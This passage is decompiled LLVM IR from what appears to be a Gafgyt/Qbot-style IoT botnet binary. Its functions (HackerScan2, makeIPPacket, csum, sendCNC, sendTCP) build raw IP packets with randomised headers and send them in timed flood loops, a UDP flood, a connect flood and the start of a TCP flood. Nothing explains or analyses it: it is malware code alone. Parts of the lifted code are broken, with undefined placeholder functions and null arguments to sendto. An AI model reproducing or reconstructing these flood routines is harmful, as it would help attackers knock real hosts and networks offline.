  br i1 %v8_804ec5f, label %dec_label_pc_804ef8c, label %dec_label_pc_804ec06

dec_label_pc_804ec6e:                             ; preds = %dec_label_pc_804ec06
  %v4_804ec6e = add i32 %stack_var_-84.0, 1
  br label %dec_label_pc_804ec06

dec_label_pc_804ec73:                             ; preds = %dec_label_pc_804eb4c
  store i32 %v13_804eafd, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-140, align 4
  %v5_804ec8f = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v5_804ec8f, i32* %eax.global-to-local, align 4
  %v4_804ec97 = icmp eq i32 %v5_804ec8f, 0
  %v1_804ec9b = icmp eq i1 %v4_804ec97, false
  br i1 %v1_804ec9b, label %dec_label_pc_804ecb7, label %dec_label_pc_804ec9d

dec_label_pc_804ec9d:                             ; preds = %dec_label_pc_804ec73
  %v0_804ec9d = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804ec9d = ptrtoint i8* %v0_804ec9d to i32
  store i32 %v1_804ec9d, i32* %eax.global-to-local, align 4
  store i8* %v0_804ec9d, i8** %stack_var_-140, align 4
  %v4_804ecad = call i32 @HackerPrint(i32 %v1_804ec9d, i32 ptrtoint ([27 x i8]* @global_var_805b8d0.419 to i32))
  store i32 %v4_804ecad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef89

dec_label_pc_804ecb7:                             ; preds = %dec_label_pc_804ec73
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804ecc6 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v5_804ec8f, i32* %eax.global-to-local, align 4
  %v4_804ece0 = inttoptr i32 %v5_804ec8f to i8*
  store i8* %v4_804ece0, i8** %stack_var_-140, align 4
  %v7_804ece3 = call i32 @__GI_setsockopt(i32 %v5_804ec8f, i32 0, i32 3, i32 %v2_804ecc6, i32 4)
  store i32 %v7_804ece3, i32* %eax.global-to-local, align 4
  %v2_804ece8 = icmp slt i32 %v7_804ece3, 0
  %v1_804ecea = icmp eq i1 %v2_804ece8, false
  br i1 %v1_804ecea, label %dec_label_pc_804ed39.preheader, label %dec_label_pc_804ecec

dec_label_pc_804ed39.preheader:                   ; preds = %dec_label_pc_804ecb7
  br label %dec_label_pc_804ed0f

dec_label_pc_804ecec:                             ; preds = %dec_label_pc_804ecb7
  %v0_804ecec = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804ecec = ptrtoint i8* %v0_804ecec to i32
  store i32 %v1_804ecec, i32* %eax.global-to-local, align 4
  store i8* %v0_804ecec, i8** %stack_var_-140, align 4
  %v4_804ecfc = call i32 @HackerPrint(i32 %v1_804ecec, i32 ptrtoint ([33 x i8]* @global_var_805b8ec.420 to i32))
  store i32 %v4_804ecfc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef89

dec_label_pc_804ed0f:                             ; preds = %dec_label_pc_804ed39.preheader, %dec_label_pc_804ed0f
  %v4_804ed3963 = phi i32 [ 49, %dec_label_pc_804ed39.preheader ], [ %v4_804ed39, %dec_label_pc_804ed0f ]
  store i8* null, i8** %stack_var_-140, align 4
  %v3_804ed16 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ed16, i32* %eax.global-to-local, align 4
  store i32 %v3_804ed16, i32* @ebx, align 4
  %v0_804ed1d = load i8*, i8** %stack_var_-140, align 4
  %v1_804ed1d = ptrtoint i8* %v0_804ed1d to i32
  %v2_804ed1d = call i32 @rand_cmwc(i32 %v1_804ed1d)
  %v1_804ed22 = load i32, i32* @ebx, align 4
  %v2_804ed22 = xor i32 %v1_804ed22, %v2_804ed1d
  store i32 %v2_804ed22, i32* @eax, align 4
  %v4_804ed24 = inttoptr i32 %v2_804ed22 to i8*
  store i8* %v4_804ed24, i8** %stack_var_-140, align 4
  %v2_804ed27 = call i32 @srand(i32 %v2_804ed22)
  store i32 %v2_804ed27, i32* @eax, align 4
  %v0_804ed2c = call i32 @random()
  store i32 %v0_804ed2c, i32* %eax.global-to-local, align 4
  %v4_804ed31 = inttoptr i32 %v0_804ed2c to i8*
  store i8* %v4_804ed31, i8** %stack_var_-140, align 4
  %v2_804ed34 = call i32 @init_rand(i32 %v0_804ed2c)
  store i32 %v2_804ed34, i32* %eax.global-to-local, align 4
  %v4_804ed39 = add nsw i32 %v4_804ed3963, -1
  %v13_804ed3c = icmp eq i32 %v4_804ed3963, 0
  %v1_804ed40 = icmp eq i1 %v13_804ed3c, false
  br i1 %v1_804ed40, label %dec_label_pc_804ed0f, label %dec_label_pc_804ed42

dec_label_pc_804ed42:                             ; preds = %dec_label_pc_804ed0f
  %v4_804ed42 = icmp eq i32 %arg4, 0
  %v1_804ed46 = icmp eq i1 %v4_804ed42, false
  br i1 %v1_804ed46, label %dec_label_pc_804ed51, label %dec_label_pc_804ed67

dec_label_pc_804ed51:                             ; preds = %dec_label_pc_804ed42
  %v5_804ed58 = sub i32 32, %arg4
  %v2_804ed60 = urem i32 %v5_804ed58, 32
  %v4_804ed60 = icmp eq i32 %v2_804ed60, 0
  br i1 %v4_804ed60, label %bb62, label %bb

bb:                                               ; preds = %dec_label_pc_804ed51
  %v5_804ed60 = shl i32 1, %v2_804ed60
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_804ed51, %bb
  %v0_804ed62 = phi i32 [ %v5_804ed60, %bb ], [ 1, %dec_label_pc_804ed51 ]
  %v1_804ed62 = sub i32 0, %v0_804ed62
  store i32 %v1_804ed62, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed67

dec_label_pc_804ed67:                             ; preds = %dec_label_pc_804ed42, %bb62
  %storemerge8 = phi i32 [ %v1_804ed62, %bb62 ], [ 0, %dec_label_pc_804ed42 ]
  %v1_804ed6a = add i32 %arg5, 28
  %v1_804ed76 = add i32 %arg5, 58
  %v2_804ed79 = and i32 %v1_804ed76, -16
  %v0_804ed7f = load i32, i32* @esp, align 4
  %v2_804ed7f = sub i32 %v0_804ed7f, %v2_804ed79
  %v1_804ed8b = add i32 %v2_804ed7f, 39
  %v2_804ed8e = and i32 %v1_804ed8b, -16
  store i32 %v2_804ed8e, i32* %edx.global-to-local, align 4
  %v1_804eda6 = add i32 %v2_804ed8e, 20
  %v5_804eda9 = inttoptr i32 %v1_804eda6 to i16*
  %v1_804edaf = add i32 %arg5, 8
  store i32 %v1_804edaf, i32* @ebx, align 4
  store i32 %storemerge8, i32* @eax, align 4
  %v2_804edb7 = inttoptr i32 %v2_804ed7f to i32*
  store i32 %storemerge8, i32* %v2_804edb7, align 4
  %v1_804edba = call i32 @HackerScan2(i32 %v1_804ed6a)
  store i32 %v1_804edba, i32* %eax.global-to-local, align 4
  %v1_804edbf = load i32, i32* @esp, align 4
  %v2_804edbf = inttoptr i32 %v1_804edbf to i32*
  store i32 %v1_804edba, i32* %v2_804edbf, align 4
  %v0_804edc2 = call i32 @htonl()
  %v3_804edc7 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804edc7, i32* %edx.global-to-local, align 4
  %v0_804edca = load i32, i32* @ebx, align 4
  %v1_804edca = load i32, i32* @esp, align 4
  %v2_804edca = add i32 %v1_804edca, 16
  %v3_804edca = inttoptr i32 %v2_804edca to i32*
  store i32 %v0_804edca, i32* %v3_804edca, align 4
  %v0_804edce = load i32, i32* @esp, align 4
  %v1_804edce = add i32 %v0_804edce, 12
  %v2_804edce = inttoptr i32 %v1_804edce to i32*
  store i32 17, i32* %v2_804edce, align 4
  %v1_804edd6 = load i32, i32* @esp, align 4
  %v2_804edd6 = add i32 %v1_804edd6, 8
  %v3_804edd6 = inttoptr i32 %v2_804edd6 to i32*
  store i32 %v0_804edc2, i32* %v3_804edd6, align 4
  %v0_804edda = load i32, i32* %edx.global-to-local, align 4
  %v1_804edda = load i32, i32* @esp, align 4
  %v2_804edda = add i32 %v1_804edda, 4
  %v3_804edda = inttoptr i32 %v2_804edda to i32*
  store i32 %v0_804edda, i32* %v3_804edda, align 4
  store i32 %v2_804ed8e, i32* %eax.global-to-local, align 4
  %v1_804ede1 = load i32, i32* @esp, align 4
  %v2_804ede1 = inttoptr i32 %v1_804ede1 to i32*
  store i32 %v2_804ed8e, i32* %v2_804ede1, align 4
  %v0_804ede4 = call i32 @makeIPPacket()
  %v1_804edf2 = urem i32 %v1_804edaf, 65536
  store i32 %v1_804edf2, i32* %eax.global-to-local, align 4
  %v1_804edf5 = load i32, i32* @esp, align 4
  %v2_804edf5 = inttoptr i32 %v1_804edf5 to i32*
  store i32 %v1_804edf2, i32* %v2_804edf5, align 4
  %v2_804edf8 = trunc i32 %v1_804eda6 to i16
  %v3_804edf8 = call i32 @htons(i16 %v2_804edf8)
  %v1_804edfd = urem i32 %v3_804edf8, 65536
  store i32 %v1_804edfd, i32* %edx.global-to-local, align 4
  store i32 %v1_804eda6, i32* %eax.global-to-local, align 4
  %v1_804ee03 = trunc i32 %v3_804edf8 to i16
  %v3_804ee03 = add i32 %v2_804ed8e, 24
  %v4_804ee03 = inttoptr i32 %v3_804ee03 to i16*
  store i16 %v1_804ee03, i16* %v4_804ee03, align 8
  %v2_804ee07 = call i32 @rand_cmwc(i32 %v1_804eda6)
  %v1_804ee0c = urem i32 %v2_804ee07, 65536
  store i32 %v1_804ee0c, i32* %edx.global-to-local, align 4
  store i32 %v1_804eda6, i32* %eax.global-to-local, align 4
  %v1_804ee12 = trunc i32 %v2_804ee07 to i16
  store i16 %v1_804ee12, i16* %v5_804eda9, align 4
  br i1 %v1_804eb0a, label %dec_label_pc_804ee28, label %dec_label_pc_804ee1b

dec_label_pc_804ee1b:                             ; preds = %dec_label_pc_804ed67
  %v2_804ee1b = call i32 @rand_cmwc(i32 %v1_804eda6)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804ee3c

dec_label_pc_804ee28:                             ; preds = %dec_label_pc_804ed67
  %v1_804ee2b = urem i32 %arg2, 65536
  store i32 %v1_804ee2b, i32* %eax.global-to-local, align 4
  %v1_804ee2e = load i32, i32* @esp, align 4
  %v2_804ee2e = inttoptr i32 %v1_804ee2e to i32*
  store i32 %v1_804ee2b, i32* %v2_804ee2e, align 4
  %v3_804ee31 = call i32 @htons(i16 %tmp25)
  br label %dec_label_pc_804ee3c

dec_label_pc_804ee3c:                             ; preds = %dec_label_pc_804ee1b, %dec_label_pc_804ee28
  %v1_804eef5.pre-phi = phi i32 [ %.pre, %dec_label_pc_804ee1b ], [ %v1_804ee2b, %dec_label_pc_804ee28 ]
  %storemerge10.in = phi i32 [ %v2_804ee1b, %dec_label_pc_804ee1b ], [ %v3_804ee31, %dec_label_pc_804ee28 ]
  %storemerge7 = trunc i32 %storemerge10.in to i16
  %sext = mul i32 %storemerge10.in, 65536
  %v4_804ee3f = sdiv i32 %sext, 65536
  %v3_804ee42 = add i32 %v2_804ed8e, 22
  %v4_804ee42 = inttoptr i32 %v3_804ee42 to i16*
  store i16 %storemerge7, i16* %v4_804ee42, align 2
  %v1_804ee49 = add i32 %v2_804ed8e, 26
  %v2_804ee49 = inttoptr i32 %v1_804ee49 to i16*
  store i16 0, i16* %v2_804ee49, align 2
  %v1_804ee52 = add i32 %v2_804ed8e, 28
  store i32 %v1_804ee52, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804ee58 = load i32, i32* @esp, align 4
  %v2_804ee58 = add i32 %v1_804ee58, 4
  %v3_804ee58 = inttoptr i32 %v2_804ee58 to i32*
  store i32 %arg5, i32* %v3_804ee58, align 4
  %v0_804ee5c = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee5c = load i32, i32* @esp, align 4
  %v2_804ee5c = inttoptr i32 %v1_804ee5c to i32*
  store i32 %v0_804ee5c, i32* %v2_804ee5c, align 4
  %v3_804ee5f = sext i16 %tmp to i32
  %v4_804ee5f = inttoptr i32 %v4_804ee3f to i8*
  %v5_804ee5f = call i32 @makeRandomStr(i8* %v4_804ee5f, i32 %v3_804ee5f)
  store i32 %v2_804ed8e, i32* %eax.global-to-local, align 4
  %v1_804ee67 = or i32 %v2_804ed8e, 2
  %v2_804ee67 = inttoptr i32 %v1_804ee67 to i16*
  %v3_804ee67 = load i16, i16* %v2_804ee67, align 2
  %v4_804ee67 = zext i16 %v3_804ee67 to i32
  store i32 %v4_804ee67, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed8e, i32* %eax.global-to-local, align 4
  %v1_804ee70 = load i32, i32* @esp, align 4
  %v2_804ee70 = add i32 %v1_804ee70, 4
  %v3_804ee70 = inttoptr i32 %v2_804ee70 to i32*
  store i32 %v4_804ee67, i32* %v3_804ee70, align 4
  %v0_804ee74 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee74 = load i32, i32* @esp, align 4
  %v2_804ee74 = inttoptr i32 %v1_804ee74 to i32*
  store i32 %v0_804ee74, i32* %v2_804ee74, align 4
  %v4_804ee77 = inttoptr i32 %v4_804ee3f to i16*
  %v5_804ee77 = call i32 @csum(i16* %v4_804ee77, i32 %v3_804ee5f)
  %v1_804ee7c = urem i32 %v5_804ee77, 65536
  store i32 %v1_804ee7c, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed8e, i32* %eax.global-to-local, align 4
  %v1_804ee82 = trunc i32 %v5_804ee77 to i16
  %v3_804ee82 = or i32 %v2_804ed8e, 10
  %v4_804ee82 = inttoptr i32 %v3_804ee82 to i16*
  store i16 %v1_804ee82, i16* %v4_804ee82, align 2
  %v0_804ee86 = load i32, i32* @esp, align 4
  %v1_804ee86 = inttoptr i32 %v0_804ee86 to i32*
  store i32 0, i32* %v1_804ee86, align 4
  %v2_804ee8d = inttoptr i32 %v4_804ee3f to i32*
  %v3_804ee8d = call i32 @__GI_time(i32* %v2_804ee8d)
  %v5_804ee92 = add i32 %v3_804ee8d, %arg3
  store i32 %v5_804ee92, i32* %eax.global-to-local, align 4
  %v3_804ef1b = or i32 %v2_804ed8e, 4
  %v4_804ef1b = inttoptr i32 %v3_804ef1b to i16*
  %v2_804ef37 = or i32 %v2_804ed8e, 12
  %v3_804ef37 = inttoptr i32 %v2_804ef37 to i32*
  br label %dec_label_pc_804eea1

dec_label_pc_804eea1:                             ; preds = %dec_label_pc_804ef64, %dec_label_pc_804ef81, %dec_label_pc_804ee3c
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_804ee3c ], [ %v4_804ef81, %dec_label_pc_804ef81 ], [ 0, %dec_label_pc_804ef64 ]
  %stack_var_-96.0 = phi i16 [ %tmp, %dec_label_pc_804ee3c ], [ %storemerge, %dec_label_pc_804ef81 ], [ %storemerge, %dec_label_pc_804ef64 ]
  store i32 %v2_804ed8e, i32* %edx.global-to-local, align 4
  %v0_804eea7 = load i32, i32* @esp, align 4
  %v1_804eea7 = add i32 %v0_804eea7, 20
  %v2_804eea7 = inttoptr i32 %v1_804eea7 to i32*
  store i32 16, i32* %v2_804eea7, align 4
  %v1_804eeaf = load i32, i32* @esp, align 4
  %v2_804eeaf = add i32 %v1_804eeaf, 16
  %v3_804eeaf = inttoptr i32 %v2_804eeaf to i32*
  store i32 %v2_804eb2f, i32* %v3_804eeaf, align 4
  %v0_804eeb3 = load i32, i32* @esp, align 4
  %v1_804eeb3 = add i32 %v0_804eeb3, 12
  %v2_804eeb3 = inttoptr i32 %v1_804eeb3 to i32*
  store i32 0, i32* %v2_804eeb3, align 4
  %v1_804eebe = load i32, i32* @esp, align 4
  %v2_804eebe = add i32 %v1_804eebe, 8
  %v3_804eebe = inttoptr i32 %v2_804eebe to i32*
  store i32 %v1_804ed6a, i32* %v3_804eebe, align 4
  %v0_804eec2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eec2 = load i32, i32* @esp, align 4
  %v2_804eec2 = add i32 %v1_804eec2, 4
  %v3_804eec2 = inttoptr i32 %v2_804eec2 to i32*
  store i32 %v0_804eec2, i32* %v3_804eec2, align 4
  store i32 %v5_804ec8f, i32* %eax.global-to-local, align 4
  %v1_804eec9 = load i32, i32* @esp, align 4
  %v2_804eec9 = inttoptr i32 %v1_804eec9 to i32*
  store i32 %v5_804ec8f, i32* %v2_804eec9, align 4
  %v6_804eecc = call i32 @__libc_sendto(i32 %stack_var_-80.0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804eecc, i32* %eax.global-to-local, align 4
  %v1_804eed1 = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  %v1_804eed6 = urem i32 %v1_804eed1, 65536
  store i32 %v1_804eed6, i32* %edx.global-to-local, align 4
  store i32 %v1_804eda6, i32* %eax.global-to-local, align 4
  %v1_804eedc = trunc i32 %v1_804eed1 to i16
  store i16 %v1_804eedc, i16* %v5_804eda9, align 4
  br i1 %v1_804eb0a, label %dec_label_pc_804eef2, label %dec_label_pc_804eee5

dec_label_pc_804eee5:                             ; preds = %dec_label_pc_804eea1
  %v1_804eee5 = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  br label %dec_label_pc_804ef06

dec_label_pc_804eef2:                             ; preds = %dec_label_pc_804eea1
  store i32 %v1_804eef5.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804eef8 = load i32, i32* @esp, align 4
  %v2_804eef8 = inttoptr i32 %v1_804eef8 to i32*
  store i32 %v1_804eef5.pre-phi, i32* %v2_804eef8, align 4
  %v3_804eefb = call i32 @htons(i16 %stack_var_-96.0)
  br label %dec_label_pc_804ef06

dec_label_pc_804ef06:                             ; preds = %dec_label_pc_804eee5, %dec_label_pc_804eef2
  %storemerge11.in = phi i32 [ %v1_804eee5, %dec_label_pc_804eee5 ], [ %v3_804eefb, %dec_label_pc_804eef2 ]
  %storemerge = trunc i32 %storemerge11.in to i16
  store i32 %v1_804eda6, i32* %eax.global-to-local, align 4
  %sext12 = mul i32 %storemerge11.in, 65536
  %v4_804ef09 = sdiv i32 %sext12, 65536
  store i32 %v4_804ef09, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804ee42, align 2
  %v2_804ef10 = call i32 @rand_cmwc(i32 %v4_804ef09)
  %v1_804ef15 = urem i32 %v2_804ef10, 65536
  store i32 %v1_804ef15, i32* %edx.global-to-local, align 4
  %v1_804ef1b = trunc i32 %v2_804ef10 to i16
  store i16 %v1_804ef1b, i16* %v4_804ef1b, align 4
  store i32 %storemerge8, i32* @eax, align 4
  %v1_804ef22 = load i32, i32* @esp, align 4
  %v2_804ef22 = inttoptr i32 %v1_804ef22 to i32*
  store i32 %storemerge8, i32* %v2_804ef22, align 4
  %v2_804ef25 = call i32 @HackerScan2(i32 %v4_804ef09)
  store i32 %v2_804ef25, i32* %eax.global-to-local, align 4
  %v1_804ef2a = load i32, i32* @esp, align 4
  %v2_804ef2a = inttoptr i32 %v1_804ef2a to i32*
  store i32 %v2_804ef25, i32* %v2_804ef2a, align 4
  %v0_804ef2d = call i32 @htonl()
  store i32 %v0_804ef2d, i32* %edx.global-to-local, align 4
  store i32 %v0_804ef2d, i32* %v3_804ef37, align 4
  store i32 %v2_804ed8e, i32* %eax.global-to-local, align 4
  %v3_804ef3d = load i16, i16* %v2_804ee67, align 2
  %v4_804ef3d = zext i16 %v3_804ef3d to i32
  store i32 %v4_804ef3d, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed8e, i32* %eax.global-to-local, align 4
  %v1_804ef46 = load i32, i32* @esp, align 4
  %v2_804ef46 = add i32 %v1_804ef46, 4
  %v3_804ef46 = inttoptr i32 %v2_804ef46 to i32*
  store i32 %v4_804ef3d, i32* %v3_804ef46, align 4
  %v0_804ef4a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef4a = load i32, i32* @esp, align 4
  %v2_804ef4a = inttoptr i32 %v1_804ef4a to i32*
  store i32 %v0_804ef4a, i32* %v2_804ef4a, align 4
  %v3_804ef4d = inttoptr i32 %v4_804ef09 to i16*
  %v4_804ef4d = call i32 @csum(i16* %v3_804ef4d, i32 %v13_804eafd)
  %v1_804ef52 = urem i32 %v4_804ef4d, 65536
  store i32 %v1_804ef52, i32* %edx.global-to-local, align 4
  %v1_804ef58 = trunc i32 %v4_804ef4d to i16
  store i16 %v1_804ef58, i16* %v4_804ee82, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804ef5f = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_804ef62 = icmp eq i1 %v15_804ef5f, false
  br i1 %v1_804ef62, label %dec_label_pc_804ef81, label %dec_label_pc_804ef64

dec_label_pc_804ef64:                             ; preds = %dec_label_pc_804ef06
  %v0_804ef64 = load i32, i32* @esp, align 4
  %v1_804ef64 = inttoptr i32 %v0_804ef64 to i32*
  store i32 0, i32* %v1_804ef64, align 4
  %v2_804ef6b = inttoptr i32 %v4_804ef09 to i32*
  %v3_804ef6b = call i32 @__GI_time(i32* %v2_804ef6b)
  store i32 %v3_804ef6b, i32* %eax.global-to-local, align 4
  %v8_804ef73 = icmp sgt i32 %v3_804ef6b, %v5_804ee92
  br i1 %v8_804ef73, label %dec_label_pc_804ef89, label %dec_label_pc_804eea1

dec_label_pc_804ef81:                             ; preds = %dec_label_pc_804ef06
  %v4_804ef81 = add i32 %stack_var_-80.0, 1
  br label %dec_label_pc_804eea1

dec_label_pc_804ef89:                             ; preds = %dec_label_pc_804ef64, %dec_label_pc_804ecec, %dec_label_pc_804ec9d
  %v0_804ef9222 = phi i32 [ %v4_804ecfc, %dec_label_pc_804ecec ], [ %v4_804ecad, %dec_label_pc_804ec9d ], [ %v3_804ef6b, %dec_label_pc_804ef64 ]
  br label %dec_label_pc_804ef8c

dec_label_pc_804ef8c:                             ; preds = %dec_label_pc_804ec50, %dec_label_pc_804ebae, %dec_label_pc_804eb2f, %dec_label_pc_804eb94, %dec_label_pc_804ef89
  %v0_804ef92 = phi i32 [ 0, %dec_label_pc_804ebae ], [ %v5_804eb3f, %dec_label_pc_804eb2f ], [ %v4_804eba4, %dec_label_pc_804eb94 ], [ %v0_804ef9222, %dec_label_pc_804ef89 ], [ %v3_804ec57, %dec_label_pc_804ec50 ]
  store i32 %v0_804eafc, i32* @ebx, align 4
  ret i32 %v0_804ef92

; uselistorder directives
  uselistorder i32 %v4_804ef4d, { 1, 0 }
  uselistorder i32 %v2_804ef10, { 1, 0 }
  uselistorder i32 %v4_804ef09, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_804eed1, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v5_804ee77, { 1, 0 }
  uselistorder i32 %v4_804ee3f, { 2, 1, 0 }
  uselistorder i32 %v1_804eef5.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ee2b, { 2, 1, 0 }
  uselistorder i32 %v2_804ee07, { 1, 0 }
  uselistorder i32 %v3_804edf8, { 1, 0 }
  uselistorder i32 %v1_804edf2, { 1, 0 }
  uselistorder i32 %v2_804ed8e, { 9, 8, 7, 17, 16, 15, 6, 5, 14, 4, 13, 12, 11, 10, 2, 3, 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804ed60, { 1, 0 }
  uselistorder i32 %v5_804ec8f, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i8* %v1_804ebd0, { 1, 0, 2 }
  uselistorder i32 %v2_804ebb5, { 1, 2, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_804ebb1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_804eb86, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804eb2f, { 1, 0 }
  uselistorder i32 %v1_804eb1d, { 1, 0 }
  uselistorder i8** %stack_var_-140, { 16, 15, 17, 14, 13, 12, 11, 10, 9, 18, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 6, 4, 5, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 30, 29, 31, 32, 34, 33, 36, 35, 39, 37, 38, 42, 40, 41, 44, 43, 45, 46, 47, 48, 50, 49, 51 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef8c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ef06, { 1, 0 }
  uselistorder label %dec_label_pc_804eea1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ee3c, { 1, 0 }
  uselistorder label %dec_label_pc_804ed67, { 1, 0 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_804ed0f, { 1, 0 }
  uselistorder label %dec_label_pc_804ec50, { 1, 0 }
  uselistorder label %dec_label_pc_804ec06, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eb2f, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ef93 = load i32, i32* @ebp, align 4
  store i32 %v0_804ef93, i32* %stack_var_-4, align 4
  %v4_804ef93 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ef93, i32* @ebp, align 4
  %v2_804efa0 = call i32 @__GI_time(i32* null)
  %v5_804efa5 = add i32 %v2_804efa0, %arg3
  %v1_804efb1 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804efc8 = trunc i32 %arg2 to i16
  %v2_804efc8 = call i32 @htons(i16 %v1_804efc8)
  %v4_804f000 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804f026

dec_label_pc_804efd6:                             ; preds = %dec_label_pc_804f026
  %v3_804efed = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804f00a = call i32 @__libc_connect(i32 %v3_804efed, i32 %v4_804f000, i32 16)
  %v1_804f016 = call i32 @sleep(i32 1)
  %v1_804f021 = call i32 @__libc_close(i32 %v3_804efed)
  br label %dec_label_pc_804f026

dec_label_pc_804f026:                             ; preds = %entry, %dec_label_pc_804efd6
  %v2_804f02d = call i32 @__GI_time(i32* null)
  %v5_804f035 = icmp slt i32 %v2_804f02d, %v5_804efa5
  br i1 %v5_804f035, label %dec_label_pc_804efd6, label %dec_label_pc_804f037

dec_label_pc_804f037:                             ; preds = %dec_label_pc_804f026
  %v2_804f037 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f037, i32* @ebp, align 4
  ret i32 %v2_804f02d

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804f026, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp39 = call i16 @__decompiler_undefined_function_4()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i8*, align 4
  %v0_804f03d = load i32, i32* @esi, align 4
  %v0_804f03e = load i32, i32* @ebx, align 4
  %v15_804f03f = ptrtoint i8** %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f056 = icmp eq i32 %arg2, 0
  %v1_804f05a = icmp eq i1 %v4_804f056, false
  br i1 %v1_804f05a, label %dec_label_pc_804f06a, label %dec_label_pc_804f05c

dec_label_pc_804f05c:                             ; preds = %entry
  %v1_804f05c = call i32 @rand_cmwc(i32 %v15_804f03f)
  br label %dec_label_pc_804f07f

dec_label_pc_804f06a:                             ; preds = %entry
  %v1_804f06d = urem i32 %arg2, 65536
  store i32 %v1_804f06d, i32* %eax.global-to-local, align 4
  %v4_804f070 = inttoptr i32 %v1_804f06d to i8*
  store i8* %v4_804f070, i8** %stack_var_-188, align 4
  %v2_804f073 = trunc i32 %arg2 to i16
  %v3_804f073 = call i32 @htons(i16 %v2_804f073)
  br label %dec_label_pc_804f07f

dec_label_pc_804f07f:                             ; preds = %dec_label_pc_804f05c, %dec_label_pc_804f06a
  %v2_804f07f = ptrtoint i32* %stack_var_-60 to i32
  %v5_804f082 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804f082, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804f08c = inttoptr i32 %arg1 to i8*
  store i8* %v4_804f08c, i8** %stack_var_-188, align 4
  %v5_804f08f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v5_804f08f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
